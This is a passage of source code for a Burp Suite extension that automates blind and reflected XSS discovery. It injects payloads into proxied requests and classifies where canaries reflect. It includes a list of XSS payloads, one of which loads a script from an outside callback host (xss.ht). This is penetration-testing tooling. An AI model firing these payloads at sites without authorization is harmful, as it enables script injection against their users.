# -*- coding: utf-8 -*-
"""
BitBlinder 0.7
==============

Burp Suite extension for blind & reflected XSS discovery.

Highlights vs. v0.6:
  * Reflected XSS detection with canary tokens and context classification.
  * Async injection via a bounded ThreadPoolExecutor so the Proxy stays
    responsive even under heavy payload counts.
  * Tabbed UI: Settings / Activity / Findings, with right-click pivots to
    Repeater & Intruder, CSV export, and persistence across Burp restarts.
  * Tool filter (Proxy-only), expanded never-inject-header list, body-size
    cap, request-fingerprint dedup to cut traffic.
  * Extended placeholders: $(uuid), $(canary), $(random), $(time),
    $(host), $(param).

Single-file Jython 2.7 extension - no external dependencies.
"""

from burp import IBurpExtender
from burp import IExtensionStateListener
from burp import IHttpListener
from burp import ITab

from random import choice, randint
import bisect
import datetime
import json
import string
import sys
import time

from threading import Lock as PyLock

from java.awt import BorderLayout
from java.awt import Color
from java.awt import FlowLayout
from java.awt import GridBagConstraints
from java.awt import GridBagLayout
from java.awt import GridLayout
from java.awt import Insets
from java.awt import Toolkit
from java.awt.datatransfer import StringSelection
from java.awt.event import ComponentAdapter
from java.awt.event import MouseAdapter
from java.io import File
from java.io import FileOutputStream
from java.io import OutputStreamWriter
import jarray

from java.lang import Runnable
from java.lang import String as JString
from java.lang import Thread
from java.util import ArrayList
from java.util import Base64
from java.util import LinkedHashMap
from java.util import UUID
from java.util.concurrent import ArrayBlockingQueue
from java.util.concurrent import RejectedExecutionException
from java.util.concurrent import RejectedExecutionHandler
from java.util.concurrent import Semaphore
from java.util.concurrent import ThreadFactory
from java.util.concurrent import ThreadPoolExecutor
from java.util.concurrent import TimeUnit
from java.util.concurrent.atomic import AtomicInteger
from java.util.concurrent.atomic import AtomicLong

from javax.swing import BorderFactory
from javax.swing import BoxLayout
from javax.swing import JButton
from javax.swing import JCheckBox
from javax.swing import JComboBox
from javax.swing import JFileChooser
from javax.swing import JLabel
from javax.swing import JMenuItem
from javax.swing import JOptionPane
from javax.swing import JPanel
from javax.swing import JPopupMenu
from javax.swing import JScrollPane
from javax.swing import JTabbedPane
from javax.swing import JTable
from javax.swing import JTextArea
from javax.swing import JTextField
from javax.swing import RowFilter
from javax.swing import SwingUtilities
from javax.swing.event import DocumentListener
from javax.swing.table import AbstractTableModel
from javax.swing.table import DefaultTableCellRenderer
from javax.swing.table import TableRowSorter

try:
    basestring
except NameError:
    basestring = str


# ---------------------------------------------------------------------------
# Constants & defaults
# ---------------------------------------------------------------------------

VERSION = "0.7"

CONFIG_KEY = "bitblinder.config"
FINDINGS_KEY = "bitblinder.findings"
CONFIG_VERSION = 2

OP_IGNORE_HEADER = "X-Blinder-Ignore"

# Headers we never inject into. Injecting these either breaks the request
# (Content-Length, Transfer-Encoding), corrupts session state (Cookie,
# Authorization), or makes Burp route to the wrong target (Host).
NEVER_INJECT_HEADERS = set([
    "host",
    "cookie",
    "authorization",
    "content-length",
    "transfer-encoding",
    "accept-encoding",
    "connection",
    OP_IGNORE_HEADER.lower(),
])

# Response MIME types worth scanning for reflections. Anything else is
# binary / decorative and would produce noise + waste CPU.
TEXT_LIKE_MIME = set(["HTML", "XML", "JSON", "script", "plain", "css"])

DEFAULT_MAX_BODY_SIZE = 1024 * 1024            # 1 MB: don't inject larger
MAX_RESPONSE_SCAN_BYTES = 2 * 1024 * 1024      # 2 MB scan window
MAX_RESPONSE_SIZE_BYTES = 5 * 1024 * 1024      # skip scan above this

DEFAULT_POOL_SIZE = 4
DEFAULT_QUEUE_SIZE = 200
DEFAULT_PER_HOST_PERMITS = 2
DEFAULT_DEDUP_COOLDOWN_MS = 10000

CANARY_CACHE_MAX = 10000
CANARY_TTL_MS = 5 * 60 * 1000
FINGERPRINT_CACHE_MAX = 5000
ACTIVITY_LOG_MAX = 500
FINDINGS_MAX = 1000

SEVERITY_CRITICAL = "Critical"
SEVERITY_HIGH = "High"
SEVERITY_MEDIUM = "Medium"
SEVERITY_LOW = "Low"
SEVERITY_INFO = "Info"

SEVERITY_RANK = {
    SEVERITY_CRITICAL: 4,
    SEVERITY_HIGH: 3,
    SEVERITY_MEDIUM: 2,
    SEVERITY_LOW: 1,
    SEVERITY_INFO: 0,
}

SEVERITY_COLORS = {
    SEVERITY_CRITICAL: Color(0xCC, 0x00, 0x00),
    SEVERITY_HIGH:     Color(0xE6, 0x6F, 0x00),
    SEVERITY_MEDIUM:   Color(0xC0, 0x9A, 0x00),
    SEVERITY_LOW:      Color(0x66, 0x66, 0x66),
    SEVERITY_INFO:     Color(0x55, 0x55, 0x55),
}

CONTEXT_HTML_TEXT = "HTML_TEXT"
CONTEXT_ATTR_QUOTED_DOUBLE = "ATTR_DQUOTE"
CONTEXT_ATTR_QUOTED_SINGLE = "ATTR_SQUOTE"
CONTEXT_ATTR_UNQUOTED = "ATTR_UNQUOTED"
CONTEXT_TAG = "TAG"                       # inside <tag, between attributes
CONTEXT_SCRIPT = "SCRIPT"                 # bare script body
CONTEXT_SCRIPT_DQ = "SCRIPT_DQUOTE"       # inside a JS double-quoted string
CONTEXT_SCRIPT_SQ = "SCRIPT_SQUOTE"       # inside a JS single-quoted string
CONTEXT_STYLE = "STYLE"
CONTEXT_COMMENT = "COMMENT"
CONTEXT_CDATA = "CDATA"
CONTEXT_HEADER = "HEADER_ECHO"
CONTEXT_UNKNOWN = "UNKNOWN"

DEFAULT_PAYLOADS = [
    "\"><script>alert(/$(canary)/)</script>",
]

DEFAULT_HEADERS = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
]

DEFAULT_CONFIG = {
    "ConfigVersion": CONFIG_VERSION,
    "isEnabled": False,
    "Randomize": False,
    "Payloads": DEFAULT_PAYLOADS,
    "InjectHeaders": False,
    "InjectJson": True,
    "JsonStringsOnly": True,
    "VerboseActivity": True,
    "AutoEncode": True,
    "InScopeOnly": True,
    "DetectReflections": True,
    "AppendCanary": True,
    "AddToSiteMap": True,
    "Headers": DEFAULT_HEADERS,
    "ExcludeHosts": [],
    "ExcludePaths": [],
    "ExcludeParams": [],
    "RateLimitMs": 0,
    "PoolSize": DEFAULT_POOL_SIZE,
    "QueueSize": DEFAULT_QUEUE_SIZE,
    "PerHostPermits": DEFAULT_PER_HOST_PERMITS,
    "MaxBodySize": DEFAULT_MAX_BODY_SIZE,
    "DedupCooldownMs": DEFAULT_DEDUP_COOLDOWN_MS,
}


class URL(object):
    PARAM_URL = 0
    PARAM_BODY = 1
    PARAM_COOKIE = 2
    PARAM_XML = 3
    PARAM_XML_ATTR = 4
    PARAM_MULTIPART_ATTR = 5
    PARAM_JSON = 6


# Param-types we'll target for injection.
OP_INJECTION_PARAMS = set([URL.PARAM_URL, URL.PARAM_BODY])


PAYLOAD_TEMPLATES = [
    ("Basic script tag",     "\"><script>alert(/$(canary)/)</script>"),
    ("External script (uuid)",
        "\"><script src=\"https://$(uuid).xss.ht\"></script>$(canary)"),
    ("SVG onload",           "\"><svg onload=alert(/$(canary)/)>"),
    ("Img onerror",          "\"><img src=x onerror=alert(/$(canary)/)>"),
    ("Probe (canary only)",  "$(canary)"),
    ("Attribute breakout",
        "\" autofocus onfocus=alert(/$(canary)/) x=\""),
    ("JS string breakout",   "';alert(/$(canary)/);//"),
    ("HTML comment escape",  "--><script>alert(/$(canary)/)</script><!--"),
]


# ---------------------------------------------------------------------------
# Small utility helpers (module-scope, no Burp dependency)
# ---------------------------------------------------------------------------

def normalize_lines(text):
    out = []
    for line in (text or "").splitlines():
        line = line.strip()
        if line:
            out.append(line)
    return out


def safe_int(value, default=0):
    try:
        return int(value)
    except Exception:
        return default


def now_str():
    return datetime.datetime.now().strftime("%m/%d|%H:%M:%S")


def truncate(text, limit):
    if text is None:
        return ""
    if len(text) > limit:
        return text[:limit] + "..."
    return text


def format_json_path(path):
    parts = []
    for item in path:
        if isinstance(item, int):
            parts.append("[%d]" % item)
        else:
            if not parts:
                parts.append(str(item))
            else:
                parts.append(".%s" % item)
    return "".join(parts) if parts else "$"


def csv_quote(value):
    if value is None:
        return ""
    s = value if isinstance(value, basestring) else str(value)
    if any(c in s for c in [",", "\"", "\r", "\n"]):
        return "\"" + s.replace("\"", "\"\"") + "\""
    return s


# Cap stored request bytes - extension storage is JSON in a settings blob,
# and 1000 findings * many-MB requests would blow it up.
MAX_STORED_REQUEST_BYTES = 64 * 1024


def _bytes_to_b64(data):
    """Java byte[] / Python str -> base64 ASCII string."""
    if data is None:
        return ""
    try:
        length = len(data)
    except Exception:
        return ""
    if length == 0:
        return ""
    if length > MAX_STORED_REQUEST_BYTES:
        # Truncate; we still want the headers and a hint of the body.
        try:
            data = data[:MAX_STORED_REQUEST_BYTES]
        except Exception:
            pass
    try:
        return Base64.getEncoder().encodeToString(data)
    except Exception:
        return ""


def _b64_to_bytes(s):
    """base64 ASCII string -> Java byte[]."""
    if not s:
        return None
    try:
        return Base64.getDecoder().decode(s)
    except Exception:
        return None


def _collect_marker_ranges(helpers, data, pattern_bytes):
    """Return a Java ArrayList<int[]> of {start, end} pairs for every
    occurrence of pattern_bytes inside data, suitable for Burp's
    applyMarkers().  Empty list if no matches.
    """
    out = ArrayList()
    if data is None or pattern_bytes is None:
        return out
    try:
        data_len = len(data)
        pat_len = len(pattern_bytes)
    except Exception:
        return out
    if pat_len == 0:
        return out
    cur = 0
    while cur < data_len:
        try:
            idx = helpers.indexOf(data, pattern_bytes, True, cur, data_len)
        except Exception:
            break
        if idx == -1:
            break
        out.add(jarray.array([idx, idx + pat_len], "i"))
        cur = idx + pat_len
    return out


# ---------------------------------------------------------------------------
# Canary - unique token generator + bounded LRU registry
# ---------------------------------------------------------------------------

class Canary(object):
    """
    Generates short alphanumeric markers used to detect response reflections.

    Each canary is registered with originating injection metadata so that
    when we see one in a response we can rebuild the finding.  Bounded LRU
    (LinkedHashMap with accessOrder=True) plus TTL-based eviction so this
    can't leak memory under long sessions.
    """

    _ALPHABET = string.ascii_lowercase + string.digits

    def __init__(self, max_size=CANARY_CACHE_MAX, ttl_ms=CANARY_TTL_MS):
        self.max_size = max_size
        self.ttl_ms = ttl_ms
        self.lock = PyLock()
        self.entries = LinkedHashMap(64, 0.75, True)

    def make(self):
        # Always alpha+digit, never starts with a digit -> tokenizes cleanly
        # in JS contexts.  Length 12 -> ~36^10 collision space.
        return "bb" + "".join(choice(self._ALPHABET) for _ in range(10))

    def register(self, canary, metadata):
        now_ms = int(time.time() * 1000)
        with self.lock:
            self.entries.put(canary, [metadata, now_ms])
            self._evict_locked(now_ms)

    def lookup(self, canary):
        with self.lock:
            entry = self.entries.get(canary)
            if entry is None:
                return None
            return entry[0]

    def _evict_locked(self, now_ms):
        # Size cap: drop oldest-accessed first.
        while self.entries.size() > self.max_size:
            it = self.entries.entrySet().iterator()
            if not it.hasNext():
                break
            it.next()
            it.remove()
        # TTL: walk a snapshot of keys, drop anything expired.
        cutoff = now_ms - self.ttl_ms
        for key in list(self.entries.keySet()):
            entry = self.entries.get(key)
            if entry is not None and entry[1] < cutoff:
                self.entries.remove(key)

    def size(self):
        with self.lock:
            return self.entries.size()

    def clear(self):
        with self.lock:
            self.entries.clear()


# ---------------------------------------------------------------------------
# Fingerprinter - request-shape dedup with cooldown window
# ---------------------------------------------------------------------------

class Fingerprinter(object):
    """
    Tracks recently-injected request shapes so we don't spam an endpoint that
    gets refreshed many times during normal browsing.  Bounded by entry count
    and by cooldown TTL.
    """

    def __init__(self, cooldown_ms=DEFAULT_DEDUP_COOLDOWN_MS,
                 max_size=FINGERPRINT_CACHE_MAX):
        self.cooldown_ms = max(0, int(cooldown_ms))
        self.max_size = max(1, int(max_size))
        self.lock = PyLock()
        self.entries = {}  # fingerprint -> last-seen ms

    def set_cooldown(self, cooldown_ms):
        self.cooldown_ms = max(0, int(cooldown_ms))

    def should_inject(self, fingerprint):
        if self.cooldown_ms <= 0:
            return True
        now_ms = int(time.time() * 1000)
        with self.lock:
            last = self.entries.get(fingerprint, 0)
            if last and (now_ms - last) < self.cooldown_ms:
                return False
            self.entries[fingerprint] = now_ms
            self._evict_locked(now_ms)
            return True

    def _evict_locked(self, now_ms):
        if len(self.entries) <= self.max_size:
            return
        cutoff = now_ms - self.cooldown_ms
        for k in list(self.entries.keys()):
            if self.entries[k] < cutoff:
                del self.entries[k]
        if len(self.entries) > self.max_size:
            ordered = sorted(self.entries.items(), key=lambda kv: kv[1])
            drop = len(self.entries) - self.max_size
            for k, _ in ordered[:drop]:
                del self.entries[k]

    def clear(self):
        with self.lock:
            self.entries.clear()


# ---------------------------------------------------------------------------
# HtmlContextMap - forward state-machine HTML tokenizer
#
# Used by ReflectionDetector to classify the context surrounding each canary
# occurrence with more accuracy than a backward-regex heuristic.  Concretely
# fixes false classifications in these realistic patterns:
#
#   <button data-text="<b>X</b>">          # X is inside ATTR_DQUOTE, not TAG
#   <a title="<script>" onclick="X">       # X is inside ATTR_DQUOTE, not SCRIPT
#   <script>alert("X")</script>            # X is inside SCRIPT_DQUOTE
#   <script>/*X*/</script>                 # X is still inside SCRIPT body
# ---------------------------------------------------------------------------

def _slice_to_latin1(byte_arr, start, end):
    """Decode a byte slice using ISO-8859-1 so 1 byte = 1 char.

    Latin-1 preserves byte offsets when indexing the decoded string, which
    matters because the tokenizer operates on a decoded string but the
    canary positions found via helpers.indexOf are in byte coordinates.
    Works for both Jython (Java byte[]) and CPython (bytes) inputs.
    """
    if byte_arr is None or start >= end:
        return ""
    try:
        return JString(byte_arr, int(start), int(end - start), "ISO-8859-1")
    except Exception:
        pass
    try:
        return byte_arr[start:end].decode("latin-1")
    except Exception:
        return ""


class HtmlContextMap(object):
    """Forward-parse an HTML string, then answer context_at(offset) queries.

    Output context kinds (the same constants ReflectionDetector reports):
        HTML_TEXT, TAG, ATTR_DQUOTE, ATTR_SQUOTE, ATTR_UNQUOTED,
        SCRIPT, SCRIPT_DQUOTE, SCRIPT_SQUOTE, STYLE, COMMENT, CDATA.

    Only ASCII structural characters (`<`, `>`, `"`, `'`, `=`, whitespace)
    drive transitions, so the tokenizer is encoding-safe as long as the
    input was decoded with ISO-8859-1 (so byte and char offsets coincide).
    """

    def __init__(self, text):
        self.text = text if text is not None else ""
        # transitions: sorted list of (offset, context).  The context at
        # offset O is the one entered by the most recent transition whose
        # offset is <= O.  Initialised to HTML_TEXT at 0.
        self.transitions = [(0, CONTEXT_HTML_TEXT)]
        try:
            self._parse()
        except Exception:
            # Never let a tokenizer bug kill detection - leave whatever
            # state we accumulated and continue.
            pass
        self._starts = [t[0] for t in self.transitions]

    def context_at(self, offset):
        if not self._starts:
            return CONTEXT_HTML_TEXT
        i = bisect.bisect_right(self._starts, offset) - 1
        if i < 0:
            return CONTEXT_HTML_TEXT
        return self.transitions[i][1]

    def _emit(self, offset, ctx):
        last = self.transitions[-1]
        if last[1] == ctx:
            return
        if last[0] == offset:
            self.transitions[-1] = (offset, ctx)
            return
        self.transitions.append((offset, ctx))

    def _cur(self):
        return self.transitions[-1][1]

    def _parse(self):
        text = self.text.lower()
        n = len(text)
        i = 0
        tag_name = ""
        while i < n:
            ctx = self._cur()
            ch = text[i]

            if ctx == CONTEXT_HTML_TEXT:
                if ch == "<":
                    if text[i:i+4] == "<!--":
                        self._emit(i, CONTEXT_COMMENT)
                        i += 4
                        continue
                    if text[i:i+9] == "<![cdata[":
                        self._emit(i, CONTEXT_CDATA)
                        i += 9
                        continue
                    j = i + 1
                    if j < n and text[j] == "/":
                        j += 1
                    if j < n and (text[j].isalpha() or text[j] == "_"):
                        name_start = j
                        while j < n and (text[j].isalnum()
                                         or text[j] in "-_:"):
                            j += 1
                        tag_name = text[name_start:j]
                        self._emit(i, CONTEXT_TAG)
                        i = j
                        continue
                i += 1
                continue

            if ctx == CONTEXT_TAG:
                if ch == ">":
                    if tag_name == "script":
                        self._emit(i + 1, CONTEXT_SCRIPT)
                    elif tag_name == "style":
                        self._emit(i + 1, CONTEXT_STYLE)
                    else:
                        self._emit(i + 1, CONTEXT_HTML_TEXT)
                    tag_name = ""
                    i += 1
                    continue
                if ch == "/" and i + 1 < n and text[i+1] == ">":
                    self._emit(i + 2, CONTEXT_HTML_TEXT)
                    tag_name = ""
                    i += 2
                    continue
                if ch == "=":
                    j = i + 1
                    while j < n and text[j] in " \t\r\n":
                        j += 1
                    if j >= n:
                        i = j
                        continue
                    if text[j] == '"':
                        self._emit(j + 1, CONTEXT_ATTR_QUOTED_DOUBLE)
                        i = j + 1
                        continue
                    if text[j] == "'":
                        self._emit(j + 1, CONTEXT_ATTR_QUOTED_SINGLE)
                        i = j + 1
                        continue
                    if text[j] == ">":
                        # empty attr value, treat as closing
                        if tag_name == "script":
                            self._emit(j + 1, CONTEXT_SCRIPT)
                        elif tag_name == "style":
                            self._emit(j + 1, CONTEXT_STYLE)
                        else:
                            self._emit(j + 1, CONTEXT_HTML_TEXT)
                        tag_name = ""
                        i = j + 1
                        continue
                    self._emit(j, CONTEXT_ATTR_UNQUOTED)
                    i = j
                    continue
                i += 1
                continue

            if ctx == CONTEXT_ATTR_QUOTED_DOUBLE:
                if ch == '"':
                    self._emit(i + 1, CONTEXT_TAG)
                i += 1
                continue

            if ctx == CONTEXT_ATTR_QUOTED_SINGLE:
                if ch == "'":
                    self._emit(i + 1, CONTEXT_TAG)
                i += 1
                continue

            if ctx == CONTEXT_ATTR_UNQUOTED:
                if ch in " \t\r\n":
                    self._emit(i, CONTEXT_TAG)
                    continue
                if ch == ">":
                    if tag_name == "script":
                        self._emit(i + 1, CONTEXT_SCRIPT)
                    elif tag_name == "style":
                        self._emit(i + 1, CONTEXT_STYLE)
                    else:
                        self._emit(i + 1, CONTEXT_HTML_TEXT)
                    tag_name = ""
                    i += 1
                    continue
                i += 1
                continue

            if ctx == CONTEXT_COMMENT:
                if text[i:i+3] == "-->":
                    self._emit(i + 3, CONTEXT_HTML_TEXT)
                    i += 3
                    continue
                i += 1
                continue

            if ctx == CONTEXT_CDATA:
                if text[i:i+3] == "]]>":
                    self._emit(i + 3, CONTEXT_HTML_TEXT)
                    i += 3
                    continue
                i += 1
                continue

            if ctx == CONTEXT_SCRIPT:
                if text[i:i+9] == "</script>":
                    self._emit(i + 9, CONTEXT_HTML_TEXT)
                    i += 9
                    continue
                if ch == '"':
                    self._emit(i + 1, CONTEXT_SCRIPT_DQ)
                    i += 1
                    continue
                if ch == "'":
                    self._emit(i + 1, CONTEXT_SCRIPT_SQ)
                    i += 1
                    continue
                if ch == "/" and i + 1 < n and text[i+1] == "/":
                    nl = text.find("\n", i)
                    i = n if nl == -1 else nl + 1
                    continue
                if ch == "/" and i + 1 < n and text[i+1] == "*":
                    close = text.find("*/", i + 2)
                    i = n if close == -1 else close + 2
                    continue
                i += 1
                continue

            if ctx == CONTEXT_SCRIPT_DQ:
                if ch == "\\":
                    i += 2
                    continue
                if ch == '"':
                    self._emit(i + 1, CONTEXT_SCRIPT)
                i += 1
                continue

            if ctx == CONTEXT_SCRIPT_SQ:
                if ch == "\\":
                    i += 2
                    continue
                if ch == "'":
                    self._emit(i + 1, CONTEXT_SCRIPT)
                i += 1
                continue

            if ctx == CONTEXT_STYLE:
                if text[i:i+8] == "</style>":
                    self._emit(i + 8, CONTEXT_HTML_TEXT)
                    i += 8
                    continue
                i += 1
                continue

            # Unknown state - advance defensively.
            i += 1


# ---------------------------------------------------------------------------
# ReflectionDetector - byte-level canary scan + context classification
# ---------------------------------------------------------------------------

class ReflectionDetector(object):
    """
    Scans a response body for canary occurrences and classifies the
    surrounding context to score severity.

    Operates on raw bytes via Burp's helpers.indexOf so multibyte / non-UTF8
    responses match correctly.  Only inspects the first ~2 MB of body to
    bound CPU.  Skips non-text mime types entirely.
    """

    MAX_OCCURRENCES = 8       # diminishing returns past this
    LOOK_BACK = 512
    LOOK_AHEAD = 64

    def __init__(self, helpers):
        self.helpers = helpers

    def scan_body(self, response_bytes, canary, payload):
        if response_bytes is None or not canary:
            return []
        try:
            info = self.helpers.analyzeResponse(response_bytes)
        except Exception:
            return []
        mime = (info.getStatedMimeType() or
                info.getInferredMimeType() or "")
        if mime not in TEXT_LIKE_MIME:
            return []
        total = len(response_bytes)
        if total > MAX_RESPONSE_SIZE_BYTES:
            return []

        body_start = info.getBodyOffset()
        scan_end = min(total, body_start + MAX_RESPONSE_SCAN_BYTES)
        try:
            canary_bytes = self.helpers.stringToBytes(canary)
        except Exception:
            return []

        # Build the context map once for the whole scanned body slice.
        # offsets are relative to body_start.
        body_text = _slice_to_latin1(response_bytes, body_start, scan_end)
        ctx_map = HtmlContextMap(body_text)

        out = []
        cursor = body_start
        while cursor < scan_end and len(out) < self.MAX_OCCURRENCES:
            try:
                idx = self.helpers.indexOf(
                    response_bytes, canary_bytes, True, cursor, scan_end
                )
            except Exception:
                break
            if idx == -1:
                break
            context, severity, excerpt, status = self._classify_body(
                response_bytes, body_start, idx, len(canary_bytes),
                payload, ctx_map
            )
            out.append((context, severity, excerpt, status))
            cursor = idx + len(canary_bytes)
        return out

    def scan_headers(self, response_bytes, canary):
        """Header reflection check - separate channel, separate severity."""
        if response_bytes is None or not canary:
            return []
        try:
            info = self.helpers.analyzeResponse(response_bytes)
            headers = list(info.getHeaders())
        except Exception:
            return []
        results = []
        for h in headers[1:]:  # skip status-line
            if canary in h:
                name = h.split(":", 1)[0].strip().lower()
                if name in ("content-type",):
                    sev = SEVERITY_HIGH
                elif name in ("refresh", "location", "link"):
                    sev = SEVERITY_HIGH
                elif name.startswith("set-cookie"):
                    sev = SEVERITY_MEDIUM
                else:
                    sev = SEVERITY_LOW
                results.append((CONTEXT_HEADER, sev,
                                truncate(h, 160), 200))
        return results

    def _classify_body(self, response_bytes, body_start, idx,
                       canary_len, payload, ctx_map):
        win_start = max(body_start, idx - self.LOOK_BACK)
        try:
            prefix = self.helpers.bytesToString(
                response_bytes[win_start:idx]
            )
        except Exception:
            prefix = ""
        suf_end = min(len(response_bytes), idx + canary_len + self.LOOK_AHEAD)
        try:
            suffix = self.helpers.bytesToString(
                response_bytes[idx + canary_len:suf_end]
            )
        except Exception:
            suffix = ""

        excerpt = (truncate(prefix[-80:], 80) +
                   "[CANARY]" +
                   truncate(suffix[:48], 48))
        excerpt = excerpt.replace("\r", " ").replace("\n", " ")

        context = ctx_map.context_at(idx - body_start)
        prefix_l = prefix.lower()
        suffix_l = suffix.lower()
        severity = self._severity(context, prefix_l, suffix_l, payload)
        return context, severity, excerpt, 0

    def _severity(self, context, prefix_l, suffix_l, payload):
        # Tag bodies and unquoted attrs let you inject new attributes or
        # break out trivially.
        if context == CONTEXT_TAG or context == CONTEXT_ATTR_UNQUOTED:
            return SEVERITY_CRITICAL
        if context == CONTEXT_SCRIPT:
            return SEVERITY_CRITICAL
        if context == CONTEXT_SCRIPT_DQ:
            return SEVERITY_CRITICAL if '"' in payload else SEVERITY_MEDIUM
        if context == CONTEXT_SCRIPT_SQ:
            return SEVERITY_CRITICAL if "'" in payload else SEVERITY_MEDIUM
        if context == CONTEXT_HTML_TEXT:
            # Critical requires that the *payload* introduced a `<` AND that
            # `<` survived unencoded near the canary.  Without the first
            # condition we'd flag every benign reflection in HTML body text
            # as Critical just because the surrounding template contains
            # `</p>` / `</div>` etc.
            window = (prefix_l[-32:] + suffix_l[:32])
            if ("<" in payload and "<" in window
                    and "&lt;" not in window):
                return SEVERITY_CRITICAL
            return SEVERITY_MEDIUM
        if context == CONTEXT_ATTR_QUOTED_DOUBLE:
            return SEVERITY_HIGH if '"' in payload else SEVERITY_MEDIUM
        if context == CONTEXT_ATTR_QUOTED_SINGLE:
            return SEVERITY_HIGH if "'" in payload else SEVERITY_MEDIUM
        if context == CONTEXT_STYLE:
            return SEVERITY_MEDIUM
        if context == CONTEXT_COMMENT:
            return SEVERITY_MEDIUM
        if context == CONTEXT_CDATA:
            return SEVERITY_MEDIUM
        return SEVERITY_LOW


# ---------------------------------------------------------------------------
# WorkerPool - bounded async executor with per-host concurrency cap
# ---------------------------------------------------------------------------

class _DaemonThreadFactory(ThreadFactory):
    def __init__(self, prefix):
        self.prefix = prefix
        self.counter = AtomicLong(0)

    def newThread(self, runnable):
        t = Thread(runnable, "%s-%d" %
                   (self.prefix, self.counter.incrementAndGet()))
        t.setDaemon(True)
        return t


class _CountingCallerRuns(RejectedExecutionHandler):
    """
    CallerRunsPolicy semantics, but counts how often we fall back so we can
    surface back-pressure in the UI.  Using CallerRuns (not AbortPolicy) is
    critical: AbortPolicy would throw RejectedExecutionException into Burp's
    listener thread on queue overflow.
    """

    def __init__(self, on_reject):
        self.on_reject = on_reject

    def rejectedExecution(self, runnable, executor):
        try:
            self.on_reject()
        except Exception:
            pass
        if not executor.isShutdown():
            runnable.run()


class _RunnableTask(Runnable):
    def __init__(self, semaphore, fn, on_error):
        self.semaphore = semaphore
        self.fn = fn
        self.on_error = on_error

    def run(self):
        try:
            self.semaphore.acquire()
        except Exception as exc:
            self.on_error("acquire failed: %s" % exc)
            return
        try:
            self.fn()
        except Exception as exc:
            self.on_error("worker error: %s" % exc)
        finally:
            try:
                self.semaphore.release()
            except Exception:
                pass


class WorkerPool(object):
    def __init__(self, pool_size, queue_size, per_host_permits, on_error):
        self.pool_size = max(1, int(pool_size))
        self.queue_size = max(1, int(queue_size))
        self.per_host_permits = max(1, int(per_host_permits))
        self.on_error = on_error
        self._rejected = AtomicLong(0)
        queue = ArrayBlockingQueue(self.queue_size)
        factory = _DaemonThreadFactory("bitblinder")
        policy = _CountingCallerRuns(self._rejected.incrementAndGet)
        self.executor = ThreadPoolExecutor(
            self.pool_size, self.pool_size, 60, TimeUnit.SECONDS,
            queue, factory, policy
        )
        self.host_locks = {}
        self.host_locks_lock = PyLock()

    def _semaphore_for(self, host):
        with self.host_locks_lock:
            sem = self.host_locks.get(host)
            if sem is None:
                sem = Semaphore(self.per_host_permits)
                self.host_locks[host] = sem
            return sem

    def submit(self, host, fn):
        sem = self._semaphore_for(host)
        task = _RunnableTask(sem, fn, self.on_error)
        try:
            self.executor.execute(task)
        except RejectedExecutionException:
            task.run()
        except Exception as exc:
            self.on_error("submit failed: %s" % exc)

    def queue_depth(self):
        try:
            return self.executor.getQueue().size()
        except Exception:
            return 0

    def rejected_count(self):
        return int(self._rejected.get())

    def shutdown(self):
        try:
            self.executor.shutdownNow()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Data records: Injection, Finding
# ---------------------------------------------------------------------------

class Injection(object):
    KIND_PARAM = "param"
    KIND_JSON = "json"
    KIND_HEADER = "header"

    def __init__(self, kind, where, ptype, payload, canary, request_bytes):
        self.kind = kind            # KIND_*
        self.where = where          # param name / json path / header name
        self.ptype = ptype          # URL.PARAM_* or None
        self.payload = payload      # rendered payload string
        self.canary = canary        # 12-char marker, or None
        self.request_bytes = request_bytes  # full outgoing request


class Finding(object):
    """One confirmed reflected-XSS finding ready for the UI / persistence."""

    def __init__(self, time_str, host, port, https, method, path,
                 kind, where, severity, context, status_code, size,
                 payload, canary, excerpt,
                 original_request_b64, injected_request_b64):
        self.time_str = time_str
        self.host = host
        self.port = port
        self.https = bool(https)
        self.method = method
        self.path = path
        self.kind = kind
        self.where = where
        self.severity = severity
        self.context = context
        self.status_code = status_code
        self.size = size
        self.payload = payload
        self.canary = canary
        self.excerpt = excerpt
        self.original_request_b64 = original_request_b64
        self.injected_request_b64 = injected_request_b64
        self.false_positive = False

    def to_dict(self):
        return {
            "time_str": self.time_str,
            "host": self.host,
            "port": self.port,
            "https": self.https,
            "method": self.method,
            "path": self.path,
            "kind": self.kind,
            "where": self.where,
            "severity": self.severity,
            "context": self.context,
            "status_code": self.status_code,
            "size": self.size,
            "payload": self.payload,
            "canary": self.canary,
            "excerpt": self.excerpt,
            "original_request_b64": self.original_request_b64,
            "injected_request_b64": self.injected_request_b64,
            "false_positive": self.false_positive,
        }

    @classmethod
    def from_dict(cls, d):
        f = cls(
            d.get("time_str", ""), d.get("host", ""), d.get("port", 0),
            d.get("https", False), d.get("method", ""), d.get("path", ""),
            d.get("kind", ""), d.get("where", ""),
            d.get("severity", SEVERITY_INFO),
            d.get("context", CONTEXT_UNKNOWN),
            d.get("status_code", 0), d.get("size", 0),
            d.get("payload", ""), d.get("canary", ""),
            d.get("excerpt", ""),
            d.get("original_request_b64", ""),
            d.get("injected_request_b64", ""),
        )
        f.false_positive = bool(d.get("false_positive", False))
        return f


# ---------------------------------------------------------------------------
# InjectionPlanner - pure planning of injection points (no I/O)
# ---------------------------------------------------------------------------

class InjectionPlanner(object):
    """
    Given an incoming request + a config snapshot, produces a list of
    Injection records ready to send.  Each injection has its own fresh
    canary so reflections can be attributed back to the exact param.
    """

    def __init__(self, helpers, canary):
        self.helpers = helpers
        self.canary = canary

    def plan(self, request_bytes, request_info, http_service, config):
        host = http_service.getHost()
        params = request_info.getParameters()
        body_offset = request_info.getBodyOffset()
        body = request_bytes[body_offset:]
        try:
            body_text = self.helpers.bytesToString(body)
        except Exception:
            body_text = ""
        headers = list(request_info.getHeaders())

        out = []

        # URL & body params.
        exclude_params_lower = set(config["exclude_params_lower"])
        for param in params:
            ptype = param.getType()
            if ptype not in OP_INJECTION_PARAMS:
                continue
            pname = param.getName()
            if pname.lower() in exclude_params_lower:
                continue

            payload, canary = self._render(pname, host, config)
            injected = self._inject_param(
                request_bytes, param, payload, config["auto_encode"]
            )
            if injected is None:
                continue
            injected = self._ensure_ignore_header_bytes(injected)
            if injected is None:
                continue
            out.append(Injection(
                Injection.KIND_PARAM, pname, ptype,
                payload, canary, injected
            ))

        # JSON body.
        if config["inject_json"]:
            json_object, json_paths, json_error = self._maybe_parse_json(
                headers, body_text, config["json_strings_only"]
            )
            if json_object is not None and json_paths:
                for path in json_paths:
                    payload, canary = self._render(
                        format_json_path(path), host, config
                    )
                    injected_body_text = self._json_inject(
